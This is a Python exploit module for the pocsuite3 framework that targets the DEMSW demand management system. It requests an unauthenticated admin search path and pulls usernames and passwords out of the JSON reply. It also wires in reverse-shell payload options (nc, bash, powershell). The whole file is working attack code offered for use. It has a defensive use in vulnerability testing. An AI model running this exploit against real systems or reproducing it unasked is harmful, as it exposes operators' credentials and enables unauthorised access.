# !/usr/bin/env python
# -*- coding: UTF-8 -*-
import json
import string
from collections import OrderedDict
import random
from urllib.parse import urlparse, urljoin
import re
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.lib.core.interpreter_option import OptDict
from pocsuite3.modules.listener import REVERSE_PAYLOAD


class DEMSW(POCBase):
    vulID = ''
    version = '1.0'
    author = ['Warin9_0']
    vulDate = '2022-05-12'
    createDate = '2022-05-12'
    updateDate = '2022-05-12'
    references = ['']
    name = 'DEMSW_Read_user_password'
    appPowerLink = ''
    appName = 'DEMSW 需量管理系統'
    appVersion = """"""
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''DEMSW_Read_user_password'''
    samples = ['']
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP


    def _options(self):
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
            "powershell": REVERSE_PAYLOAD.POWERSHELL,
        }
        o["command"] = OptDict(selected="powershell", default=payload)
        return o

    def _check(self, url):
        self.timeout = 5
        path = "/?a=Admin/Supervisor&b=Search"
        url = url.strip("/")
        vul_url = urljoin(url, path)
        parse = urlparse(vul_url)
        headers = {
            "Host": "{}".format(parse.netloc)
            }
        try:
            r = requests.get(vul_url, headers=headers, timeout=self.timeout, verify=False,allow_redirects=False)
        except Exception:
            return False
        else:
            if r.status_code == 302 and "Username" in r.text:
                rjson = json.loads(r.text)
                for user in rjson['Data']:
                    username = user['Username']
                    password = user['Password']
                    return url,headers,vul_url,r.text,username,password
            else:
                return False

    def _verify(self):
        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[2]
            result['VerifyInfo']['Verification code'] = '\n' + p[3]
            result['VerifyInfo']['Username'] = p[4]
            result['VerifyInfo']['Password'] = p[5]
        else:
            return False
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('url is not vulnerable')
        return output


register_poc(DEMSW)
